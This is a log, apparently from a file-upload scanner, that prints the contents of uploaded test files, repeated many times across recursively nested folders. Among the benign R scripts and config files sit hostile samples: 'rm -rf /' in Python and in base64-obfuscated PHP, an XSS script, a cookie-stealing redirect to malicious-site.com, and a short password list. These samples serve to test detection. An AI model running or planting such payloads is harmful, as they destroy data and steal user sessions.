2025-02-22 20:41:00,932 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:41:00,934 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:41:00,935 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:41:00,936 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:41:00,937 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:41:00,938 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:41:00,939 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:41:00,940 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:41:00,942 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:41:00,943 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:41:00,944 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:41:00,945 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:41:00,946 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:41:00,949 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:41:00,950 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:41:00,953 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:41:00,954 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:41:00,955 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:41:00,956 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:41:00,957 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:41:00,958 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:41:00,959 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:41:00,964 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:41:00,965 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:41:00,966 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:41:00,969 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:41:00,970 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:41:00,972 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:41:00,974 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:41:00,975 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:41:00,976 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:41:00,977 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:41:00,978 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:41:00,979 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:41:00,985 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:41:00,986 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:41:00,987 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:41:00,989 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:41:00,990 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:41:00,993 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:41:00,994 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:41:00,995 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:41:00,996 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:41:00,997 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:41:00,998 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:41:00,999 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:41:01,005 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:41:01,006 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:41:01,007 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:41:01,009 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:41:01,010 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:41:01,013 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:41:01,014 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:41:01,015 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:41:01,016 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:41:01,017 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:41:01,018 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:41:01,019 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:41:01,025 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:41:01,026 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:41:01,027 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:41:01,028 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:41:01,030 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:41:01,031 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:41:01,032 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:41:01,033 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:41:01,034 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:41:01,035 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:41:01,036 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:41:01,037 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:41:01,038 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:41:01,039 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:41:01,040 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:41:01,041 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:41:01,042 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:41:01,043 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:41:01,044 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:41:01,046 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:41:01,047 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:41:01,048 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:41:01,049 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:41:01,050 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:41:01,051 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:41:01,053 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:41:01,055 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:41:01,056 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:41:01,058 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:41:01,060 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:41:01,062 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:41:01,063 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:41:01,066 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:41:01,068 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:41:01,070 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:41:01,072 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:41:01,074 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:41:01,076 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:41:01,078 - Extracted content from uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:41:01,079 - Extracted content from uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:41:01,081 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:41:01,083 - Extracted content from uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:41:01,084 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:41:01,086 - Extracted content from uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:41:01,088 - Extracted content from uploads/new_test/new_test/HELLO.txt: hello bro
